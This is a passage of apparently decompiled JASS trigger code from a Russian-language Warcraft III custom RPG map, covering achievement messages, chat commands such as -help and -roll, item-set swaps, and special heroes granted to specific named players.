else
endif
if z3() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffМы не захлебнёмся:|r Одолейте Асмодеуса с первой попытки, не используя заклинания воскрешения")
else
endif
if z4() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffКоллекционер:|r улучшите наклейки до 15 уровня")
else
endif
if z5() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffПовелитель снега:|r Одолейте Главу Новогоднего корпоратива без использования заклинаний воскрешения. Если любой из вашей команды кого-то воскресит - достиже�")
else
endif
if z6() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffМоре по колено:|r Одолейте Тиллу с максимальным уровнем её усилений. При убийстве вы должны находится на её арене")
else
endif
if z7() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffЗвёздочет:|r Добыть Звездопад")
else
endif
if z8() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffНиндзя:|r Добыть Сюрикен")
else
endif
if z9() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffНас не оглушить!:|r Улучшить предмет \"Проклятый оберег\" до 3-го уровня")
else
endif
if BBB() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffМагия? Не, не слышали:|r Улучшить предмет \"Магический оберег\" до 3-го уровня")
else
endif
if BBC() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffНеуловимый:|r Соберите предмет Ботинки Невесомости")
else
endif
if BBD() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffЛовкость:|r Улучшите предмет Змеиная Ловкость до 3-го уровня")
else
endif
if BBE() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffПроклятый:|r Улучшите предмет Проклятье до 3-го уровня")
else
endif
if BBF() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffЦелитель:|r Улучшите предмет Исцеление до 3-го уровня")
else
endif
if BBG() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffКаменный:|r Улучшите предмет Камень какой-то до 3-го уровня")
else
endif
if BBH() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffСвиточек:|r Улучшите предмет Свиточек до 3-го уровня")
else
endif
if BBI() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffЯ так просто не сдамся:|r Поднимите более 3-х Цветочков на боссе Каменный Великан")
else
endif
if BBJ() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffПраздничный настрой:|r Получите Новогоднюю Шапку")
else
endif
if BBK() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffМаксимум:|r Получите максимальный уровень.")
else
endif
if BBL() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffГладиатор:|r Улучшите Амулет Арены на максимально доступный уровень.")
else
endif
if BBM() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffВместе веселей:|r Сколько Вы продержитесь в игре в полном составе? Проверьте.")
else
endif
if BBN() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffИграть, играть, играть!:|r Отдайте для игры несколько часов своего времени.")
else
endif
if BBO() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffУбей их всех:|r Пролейте много крови. Очень много.")
else
endif
if BBP() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffДобытчик:|r Получите дополнительную награду за врагов более 10-ти раз. Проверка: -gk")
else
endif
if BBQ() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffСмерть - лишь начало:|r Умирайте.")
else
endif
if BBR() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffДеньги - зло:|r Накопите 140000 золота")
else
endif
if BBS() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffЗнаток:|r Выполнить более 10 заданий в первые 15 минут игрового времени")
else
endif
if BBT() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffКровоносная тварь:|r Получите более 9000 Кровавых Меток")
else
endif
if BBU() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffСтать бы гробовщиком:|r Похороните что-то. Или кого-то.")
else
endif
if BBV() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffСкорострел:|r Вскройте все 20 сундуков быстрее, чем за 8 минут.")
else
endif
if BBW() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffВождь Арахнидов:|r Ну, тут много ума не надо. Поймете сами.")
else
endif
if BBX() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffПрелестный читатель:|r соберите все скрытые Книги.")
else
endif
if BBY() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffНа пути разрушения:|r Сломайте все 5 обелисков.")
else
endif
if BBZ() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffСквозь воду:|r Раскройте тайну водопада.")
else
endif
if BBa() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffРастения во благо:|r А вот этого Вам знать не положено.")
else
endif
if BBb() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffНовогодний корпоратив:|r Одолейте того, кто заведует Новым Годом.")
else
endif
if BBc() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffНесущий смерть:|r Поучаствуйте в убийстве всех 7-ми рейдовых боссов за одну игру.")
else
endif
if BBd() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"|c0000ffffВсезнающий:|r Выполните задание Пингвина")
else
endif
endfunction
function BBf takes nothing returns nothing
set YF=CreateTrigger()
call TriggerRegisterPlayerChatEvent(YF,Player(0),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(1),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(2),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(3),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(4),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(5),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(6),"-",false)
call TriggerRegisterPlayerChatEvent(YF,Player(7),"-",false)
call TriggerAddAction(YF,function BBe)
endfunction
function BBg takes player Ht returns nothing
if GetPlayerName(Ht)=="sandrbash#2985" then
set OE[GetPlayerId(Ht)]="sandrbash"
elseif GetPlayerName(Ht)=="sandrbash" then
set OE[GetPlayerId(Ht)]="sandrbash#2985"
elseif GetPlayerName(Ht)=="LightEvi1" then
set OE[GetPlayerId(Ht)]="LightEvil#21286"
elseif GetPlayerName(Ht)=="LightEvil#21286" then
set OE[GetPlayerId(Ht)]="LightEvi1"
endif
endfunction
function BBh takes unit Hu,integer VD,integer PQ,integer VE,integer VF,integer VG,integer VH,integer VI,integer VJ,integer YK,integer YL returns nothing
local integer L9
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
if GetUnitAbilityLevel(YJ,VD)>=1 then
set L9=GetUnitAbilityLevel(YJ,VD)
call UnitAddAbility(MT[Ma],VD)
call SetUnitAbilityLevel(MT[Ma],VD,L9)
endif
if GetUnitAbilityLevel(YJ,PQ)>=1 then
set L9=GetUnitAbilityLevel(YJ,PQ)
call UnitAddAbility(MT[Ma],PQ)
call SetUnitAbilityLevel(MT[Ma],PQ,L9)
endif
if GetUnitAbilityLevel(YJ,VE)>=1 then
set L9=GetUnitAbilityLevel(YJ,VE)
call UnitAddAbility(MT[Ma],VE)
call SetUnitAbilityLevel(MT[Ma],VE,L9)
endif
if GetUnitAbilityLevel(YJ,VF)>=1 then
set L9=GetUnitAbilityLevel(YJ,VF)
call UnitAddAbility(MT[Ma],VF)
call SetUnitAbilityLevel(MT[Ma],VF,L9)
endif
if GetUnitAbilityLevel(YJ,VG)>=1 then
set L9=GetUnitAbilityLevel(YJ,VG)
call UnitAddAbility(MT[Ma],VG)
call SetUnitAbilityLevel(MT[Ma],VG,L9)
endif
if GetUnitAbilityLevel(YJ,VH)>=1 then
set L9=GetUnitAbilityLevel(YJ,VH)
call UnitAddAbility(MT[Ma],VH)
call SetUnitAbilityLevel(MT[Ma],VH,L9)
endif
if GetUnitAbilityLevel(YJ,VI)>=1 then
set L9=GetUnitAbilityLevel(YJ,VI)
call UnitAddAbility(MT[Ma],VI)
call SetUnitAbilityLevel(MT[Ma],VI,L9)
endif
if GetUnitAbilityLevel(YJ,VJ)>=1 then
set L9=GetUnitAbilityLevel(YJ,VJ)
call UnitAddAbility(MT[Ma],VJ)
call SetUnitAbilityLevel(MT[Ma],VJ,L9)
endif
if GetUnitAbilityLevel(YJ,YK)>=1 then
set L9=GetUnitAbilityLevel(YJ,YK)
call UnitAddAbility(MT[Ma],YK)
call SetUnitAbilityLevel(MT[Ma],YK,L9)
endif
if GetUnitAbilityLevel(YJ,YL)>=1 then
set L9=GetUnitAbilityLevel(YJ,YL)
call UnitAddAbility(MT[Ma],YL)
call SetUnitAbilityLevel(MT[Ma],YL,L9)
endif
endfunction
function BBi takes integer Ma,integer YI returns nothing
local integer L9=0
local item Mc
local integer No
set YJ=MT[Ma]
set MT[Ma]=CreateUnitAtLoc(Player(Ma),YI,Location(-15500,2250),0)
call BBh(MT[Ma],$41496432,$41496433,$41496434,$41314330,$41314335,$41314341,$41314332,$41305A50,$41305A59,$41305A5A)
call BBh(MT[Ma],$41305235,$41305138,$41313032,$41313033,$41305444,$41313034,$41313035,$41305A51,$41305A52,$41305A53)
call BBh(MT[Ma],$41305052,$41305A57,$41313036,$41313038,$41313041,$41313043,$41305247,$41313057,$41313058,$41304B54)
call BBh(MT[Ma],$41305A56,$41305A58,$41313037,$41313039,$41313042,$41305557,$41313046,$41313059,$41313357,$41304B4E)
call BBh(MT[Ma],$41304B51,$41304C4B,$41313433,$41305A4C,$41305A4A,$4131354C,$41314149,$41314154,$41305333,$41305335)
call BBh(MT[Ma],$41304C4E,$41313733,$41304D42,$41305A4B,$41305035,$41305556,$4131414A,$41314153,$41305334,$41305336)
call BBh(MT[Ma],$41314430,$41314431,$41314431,$41314451,$41314452,$4131424E,$41313141,$41313247,$41304D44,$41304D4A)
call BBh(MT[Ma],$41313234,$41305045,$41305046,$4130545A,$41314450,0,0,0,0,0)
call SetHeroLevel(MT[Ma],GetHeroLevel(YJ),false)
loop
set Mc=UnitItemInSlot(YJ,L9)
set No=GetItemTypeId(Mc)
set Mc=UnitAddItemByIdSwapped(No,MT[Ma])
call SetItemUserData(Mc,GetPlayerId(GetOwningPlayer(YJ))+1)
set L9=L9+1
exitwhen L9>=6
endloop
call RemoveUnit(YJ)
set Mc=null
endfunction
function BBj takes player Ht,string YH returns nothing
local integer Ma=GetPlayerId(Ht)
if OE[Ma]=="M.U.D.R.I.K" and GetUnitTypeId(MT[Ma])==$4F303030 then
call BBi(Ma,$4F303051)
elseif OE[Ma]=="1Natsu" then
call BBi(Ma,$48303749)
elseif OE[Ma]=="TCoM-_-ORPG" and GetUnitTypeId(MT[Ma])==$48303046 then
call BBi(Ma,$48303653)
elseif OE[Ma]=="TCoM-_-ORPG" and GetUnitTypeId(MT[Ma])==$48303030 then
call BBi(Ma,$4830374B)
elseif OE[Ma]=="Silven1305" and GetUnitTypeId(MT[Ma])==$48303032 then
call BBi(Ma,$48303655)
elseif OE[Ma]=="CBET_IZ_ada" and GetUnitTypeId(MT[Ma])==$48303356 then
call BBi(Ma,$48303744)
elseif OE[Ma]=="JonnyITD" and GetUnitTypeId(MT[Ma])==$48303031 then
call BBi(Ma,$48303650)
elseif OE[Ma]=="Liks115" and GetUnitTypeId(MT[Ma])==$48303550 then
call BBi(Ma,$48303730)
elseif OE[Ma]=="dbybge2002" and GetUnitTypeId(MT[Ma])==$48303034 then
call BBi(Ma,$48303733)
elseif OE[Ma]=="Jeka_Pycckuu" and GetUnitTypeId(MT[Ma])==$4830314B then
call BBi(Ma,$48303735)
elseif OE[Ma]=="JonnyITD" and GetUnitTypeId(MT[Ma])==$45303057 then
call BBi(Ma,$45303133)
elseif OE[Ma]=="Jeka_Pycckuu" and GetUnitTypeId(MT[Ma])==$4F303034 then
call BBi(Ma,$4F30304A)
elseif OE[Ma]=="sandrbash#2985" and GetUnitTypeId(MT[Ma])==$48303443 then
call BBi(Ma,$48303654)
elseif OE[Ma]=="sandrbash#2985" and GetUnitTypeId(MT[Ma])==$45303033 then
call BBi(Ma,$45303055)
elseif OE[Ma]=="Gra2us" and GetUnitTypeId(MT[Ma])==$4F303034 then
call BBi(Ma,$4F303053)
elseif OE[Ma]=="TCoM-_-ORPG" and GetUnitTypeId(MT[Ma])==$4F303036 then
call BBi(Ma,$4F303052)
elseif OE[Ma]=="TCoM-_-ORPG" and GetUnitTypeId(MT[Ma])==$48303147 then
call BBi(Ma,$48303656)
elseif OE[Ma]=="TCoM-_-ORPG" and GetUnitTypeId(MT[Ma])==$45303033 then
call BBi(Ma,$4530304B)
elseif OE[Ma]=="LTz.V" and GetUnitTypeId(MT[Ma])==$48303034 then
call BBi(Ma,$4830364E)
elseif OE[Ma]=="sandrbash#2985" and GetUnitTypeId(MT[Ma])==$4F303034 then
call BBi(Ma,$4F303055)
elseif OE[Ma]=="sandrbash" and GetUnitTypeId(MT[Ma])==$4F303034 then
call BBi(Ma,$4F303055)
elseif OE[Ma]=="as.36rus" and GetUnitTypeId(MT[Ma])==$48303534 then
call BBi(Ma,$48303738)
endif
endfunction
function BBk takes nothing returns nothing
local integer Ma=GetPlayerId(GetTriggerPlayer())
local location Mc
local integer No
if GetEventPlayerChatString()=="-newset" or GetEventPlayerChatString()=="-туцыуе" then
if RectContainsUnit(GR,MT[Ma])==true then
if nO(MT[Ma],$49304156) then
call RemoveItem(nP(MT[Ma],$49304156))
call nQ($49304437,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304437) then
call RemoveItem(nP(MT[Ma],$49304437))
call nQ($49304156,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304339) then
call RemoveItem(nP(MT[Ma],$49304339))
call nQ($49304438,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304438) then
call RemoveItem(nP(MT[Ma],$49304438))
call nQ($49304339,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$4930544C) then
call RemoveItem(nP(MT[Ma],$4930544C))
call nQ($4930544D,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$4930544D) then
call RemoveItem(nP(MT[Ma],$4930544D))
call nQ($4930544C,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304552) then
call RemoveItem(nP(MT[Ma],$49304552))
call nQ($49304553,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304553) then
call RemoveItem(nP(MT[Ma],$49304553))
call nQ($49304552,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$4930434C) then
call RemoveItem(nP(MT[Ma],$4930434C))
call nQ($49304439,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304439) then
call RemoveItem(nP(MT[Ma],$49304439))
call nQ($4930434C,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304B55) then
call RemoveItem(nP(MT[Ma],$49304B55))
call nQ($49304B54,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49304B54) then
call RemoveItem(nP(MT[Ma],$49304B54))
call nQ($49304B55,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49305653) then
call RemoveItem(nP(MT[Ma],$49305653))
call nQ($49305654,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
elseif nO(MT[Ma],$49305654) then
call RemoveItem(nP(MT[Ma],$49305654))
call nQ($49305653,MT[Ma])
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Сет заменен!")
endif
endif
elseif GetEventPlayerChatString()=="-deltal" or GetEventPlayerChatString()=="-вудефд" then
call UnitRemoveAbility(MT[Ma],$41304D42)
call UnitRemoveAbility(MT[Ma],$41305A4A)
call UnitRemoveAbility(MT[Ma],$41313433)
call UnitRemoveAbility(MT[Ma],$41305035)
call UnitRemoveAbility(MT[Ma],$41305A4C)
call UnitRemoveAbility(MT[Ma],$41305A4B)
call UnitRemoveAbility(MT[Ma],$41305A37)
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ff0000Талисман удалён!")
elseif GetEventPlayerChatString()=="-deltrof" or GetEventPlayerChatString()=="-вудекща" then
call UnitRemoveAbility(MT[Ma],$41314330)
call UnitRemoveAbility(MT[Ma],$41314332)
call UnitRemoveAbility(MT[Ma],$41314341)
call UnitRemoveAbility(MT[Ma],$41313357)
call UnitRemoveAbility(MT[Ma],$41313234)
call UnitRemoveAbility(MT[Ma],$41313247)
call UnitRemoveAbility(MT[Ma],$41314335)
call UnitRemoveAbility(MT[Ma],$41304644)
call UnitRemoveAbility(MT[Ma],$41304645)
call UnitRemoveAbility(MT[Ma],$41304434)
call UnitRemoveAbility(MT[Ma],$41304438)
call UnitRemoveAbility(MT[Ma],$41304549)
call UnitRemoveAbility(MT[Ma],$41304557)
call UnitRemoveAbility(MT[Ma],$53303039)
call UnitRemoveAbility(MT[Ma],$41304D36)
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ff0000Трофей удалён!")
elseif GetEventPlayerChatString()=="-offw" or GetEventPlayerChatString()=="-щаац" then
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(MT[Ma]),0))
call RemoveSavedHandle(PP,GetHandleId(MT[Ma]),0)
elseif GetEventPlayerChatString()=="-hero1" or GetEventPlayerChatString()=="-рукщ1" then
call BBj(GetTriggerPlayer(),GetPlayerName(GetTriggerPlayer()))
elseif GetEventPlayerChatString()=="-starfall" or GetEventPlayerChatString()=="-ыефкафдд" then
if nO(MT[Ma],$74626172) or nO(MT[Ma],$6B336D31) or nO(MT[Ma],$77746C67) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Падение звезды': в указанную точку падает звезда, которая при падении раскалывается на 6 осколков в случайном положении в радиусе 450.  Каждый осколок живет 5 секунд и наносит всем в радиусе 150 магический урон(х2 от параметров)\n        |c00ff6969Перезарядка|r: 25 секунд.")
endif
elseif GetEventPlayerChatString()=="-deathworld" or GetEventPlayerChatString()=="-вуферцщкдв" then
if nO(MT[Ma],$49304355) or nO(MT[Ma],$4930444A) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Мир Падёт': в течении 8 секунд ваш урон повышается(300 + Сила Героя) а также каждый ваш удар будет наносить дополнительно 100% от Силы Эфиром. Взамен здоровье героя понижается 4%/сек. \n        |c00ff6969Перезарядка|r: 28 сек.")
elseif nO(MT[Ma],$49304531) or nO(MT[Ma],$49304635) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Мир Падёт': в течении 8 секунд ваш урон повышается(1000 + Сила Героя) а также каждый ваш удар будет наносить дополнительно 100% от Силы Эфиром. Взамен здоровье героя понижается 4%/сек. \n        |c00ff6969Перезарядка|r: 28 сек.")
elseif nO(MT[Ma],$4930464E) or nO(MT[Ma],$49304743) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Мир Падёт': в течении 8 секунд ваш урон повышается(500 + х2 от Силы Героя) а также каждый ваш удар будет наносить дополнительно 100% от Силы Эфиром. Взамен здоровье героя понижается 4%/сек. \n        |c00ff6969Перезарядка|r: 28 сек.")
endif
elseif GetEventPlayerChatString()=="-assur" or GetEventPlayerChatString()=="-фыыгк" then
if nO(MT[Ma],$74666172) or nO(MT[Ma],$6B79626C) or nO(MT[Ma],$6B796D6E) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Сюрикен': указанный противник получает урон(х5 от параметров) а также его атака снижается на 25% в течении 4 секунд.\n        |c00ff6969Перезарядка|r: 13 секунд.")
endif
elseif GetEventPlayerChatString()=="-dpriv" or GetEventPlayerChatString()=="-взкшм" then
if nO(MT[Ma],$49305A44) or nO(MT[Ma],$49305A35) or nO(MT[Ma],$49305938) or nO(MT[Ma],$49305939) or nO(MT[Ma],$49305A33) or nO(MT[Ma],$49305A32) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Орудие Смерти': Указанный противник полностью замирает на 2.5 сек. Каждые 0.5 сек враг получает урон(10% т.маны), а герой будет восстанавливать по 4% МР/0.5 сек. \n        На время действия Смерть неуязвима. \n        |c00ff7f00Дальность каста|r: 700 \n        |c006969ffЗатраты маны|r: 10% \n        |c00ffff00Перезарядка|r: 20 сек.|r")
endif
elseif GetEventPlayerChatString()=="-wskill" or GetEventPlayerChatString()=="-цылшдд" then
if nO(MT[Ma],$49313147) or nO(MT[Ma],$49313136) or nO(MT[Ma],$49313059) or nO(MT[Ma],$49313143) or nO(MT[Ma],$49313132) or nO(MT[Ma],$49313130) or nO(MT[Ma],$49313141) or nO(MT[Ma],$49313057) or nO(MT[Ma],$49313134) or nO(MT[Ma],$49313145) or nO(MT[Ma],$49313055) or nO(MT[Ma],$49313138) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Элементалы': При использовании спосоностей с шансом 25% вы призываете на поле боя одного из 3-х элементалей. Время жизни: 7 сек. Не больше 1 элементаля!\n        Синий элементал: при атаке замедляет врагов. AS: 0.9 сек\n        Красный элементал: наносит урон силой тьмы по области. AS: 0.7 сек\n        Зеленый жлементал: обладает аурой снижения защиты(20 ед.). AS: 1.0 сек\n        Урон элементалей: 100% от суммы параметров героя")
endif
elseif GetEventPlayerChatString()=="-килл" or GetEventPlayerChatString()=="-лшдд" or GetEventPlayerChatString()=="-kill" or GetEventPlayerChatString()=="-rbkk" then
set Mc=Location(-15420,2222)
call SetUnitPositionLoc(MT[Ma],Mc)
call KillUnit(MT[Ma])
set Ro[Ma+1]=Ro[Ma+1]-1
call RemoveLocation(Mc)
set Mc=null
elseif GetEventPlayerChatString()=="-с" or GetEventPlayerChatString()=="-c" or GetEventPlayerChatString()=="-clear" or GetEventPlayerChatString()=="-сдуфк" then
call ClearTextMessagesBJ(GetForceOfPlayer(GetTriggerPlayer()))
elseif GetEventPlayerChatString()=="-ролл" or GetEventPlayerChatString()=="-hjkk" or GetEventPlayerChatString()=="-roll" or GetEventPlayerChatString()=="-кщдд" then
set No=GetRandomInt(1,100)
if nO(NL[2+2*Ma],$49303150) then
set No=No+GetRandomInt(5,10)
endif
call DisplayTextToForce(GetPlayersAll(),"~~~~~~~~~~~~~~~~~~~~ |c00ffff00"+GetPlayerName(GetTriggerPlayer())+(" |c00ffffffвыбросил|r "+("|c0000ffff"+(I2S(No)+"|r ~~~~~~~~~~~~~~~~~~~~"))))
elseif GetEventPlayerChatString()=="-son" or GetEventPlayerChatString()=="-ыщт" then
call ShowUnit(NL[GetConvertedPlayerId(GetTriggerPlayer())*2],true)
elseif GetEventPlayerChatString()=="-soff" or GetEventPlayerChatString()=="-ыщаа" then
call ShowUnit(NL[GetConvertedPlayerId(GetTriggerPlayer())*2],false)
elseif GetEventPlayerChatString()=="-pon" or GetEventPlayerChatString()=="-зщт" then
call PauseUnit(Nc[GetConvertedPlayerId(GetTriggerPlayer())],false)
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"Питомец |c0000ff00включен")
elseif GetEventPlayerChatString()=="-poff" or GetEventPlayerChatString()=="-зщаа" then
call PauseUnit(Nc[GetConvertedPlayerId(GetTriggerPlayer())],true)
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"Питомец |c00ff0000выключен")
elseif GetEventPlayerChatString()=="-kill pet" or GetEventPlayerChatString()=="-лшдд зуе" then
set S0[GetConvertedPlayerId(GetTriggerPlayer())]=true
call RemoveUnit(Nc[GetConvertedPlayerId(GetTriggerPlayer())])
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],$41305334)
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],$41305335)
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],$41305336)
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],$41305333)
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],$41314153)
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],$41314154)
elseif GetEventPlayerChatString()=="-вкщзшеуь" or GetEventPlayerChatString()=="-dropitem" then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"Предметы выброшены")
set No=0
loop
call UnitRemoveItemFromSlotSwapped(No,NL[GetConvertedPlayerId(GetTriggerPlayer())*2])
set No=No+1
exitwhen No>6
endloop
elseif GetEventPlayerChatString()=="-1" then
call PlaySoundAtPointBJ(F,150,GetUnitLoc(MT[Ma]),0)
elseif GetEventPlayerChatString()=="-2" then
call PlaySoundAtPointBJ(G,150,GetUnitLoc(MT[Ma]),0)
elseif GetEventPlayerChatString()=="-3" then
call PlaySoundAtPointBJ(E,150,GetUnitLoc(MT[Ma]),0)
elseif GetEventPlayerChatString()=="-4" then
call PlaySoundAtPointBJ(D,150,GetUnitLoc(MT[Ma]),0)
elseif GetEventPlayerChatString()=="-тдмд" or GetEventPlayerChatString()=="-nlvl" then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c0000ffffВаш уровень наклейки|r: "+I2S(GetUnitAbilityLevel(MT[Ma],$41305045)))
elseif GetEventPlayerChatString()=="-рудз" or GetEventPlayerChatString()=="-help" then
call ClearTextMessagesBJ(GetForceOfPlayer(GetTriggerPlayer()))
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c0000ff00Выберите категорию, которую желаете изучить|r \n        Герои и Способности (-info1)\n        Прокачка уровня (-info2)\n        Арена (-info3)\n        Система магазина, предметы, крафт (-info4)")
elseif GetEventPlayerChatString()=="-штащ1" or GetEventPlayerChatString()=="-info1" then
call ClearTextMessagesBJ(GetForceOfPlayer(GetTriggerPlayer()))
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c0000ff00Герои и способности|r. В карте на выбор доступно определенное количество персонажей, каждый из которых \nобладает уникальными способностями, которые Вы можете изучить при стартовом запуске игры. \nСпособности персонажей прокачиваются автоматически, начиная с 2-го уровня. |c00ff7f00Описание способностей|r:")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ffff00Нулевая с-ть|r. Доступна с 1 уровня, не прокачивается. Есть не у всех героев.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ffff00Первая с-ть|r. Доступна с 1 уровня, прокачивается каждые 5 уровней, начиная с 10. Максимальный: 10")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ffff00Вторая и третья с-сти|r. Доступны с 2 уровня, прокачиваются каждые 3 уровня. Максимальный: 10")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ffff00Четвертая с-ть|r. Доступна с 10 уровня, прокачивается каждые 3 уровня. Максимальный: 10")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ffff00Пятая с-сть|r. Доступна с 20 уровня, прокачивается каждые 9 уровней. Максимальный: 3")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ff0000Ультимейт|r. Доступен с 30 уровня, прокачивается каждые 5 уровней. Максимальный: 5")
elseif GetEventPlayerChatString()=="-штащ2" or GetEventPlayerChatString()=="-info2" then
call ClearTextMessagesBJ(GetForceOfPlayer(GetTriggerPlayer()))
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c0000ff00Прокачка уровня|r. В карте существует много видов получения опыта персонажа:\n-|c00ff7f00Крипы|r. Самый стандартный меток прокачки героя – убийство крипов в различных локациях. Опыт с \nубитого крипа дается всем в радиусе 900 и умножается на количество Героев рядом. Также опыт с крипов \nдают лишь тем героям, чей уровень соответствует уровню локации (уровень локаций указан на табличках, \nкоторые стоят в начале каждой локации). ")
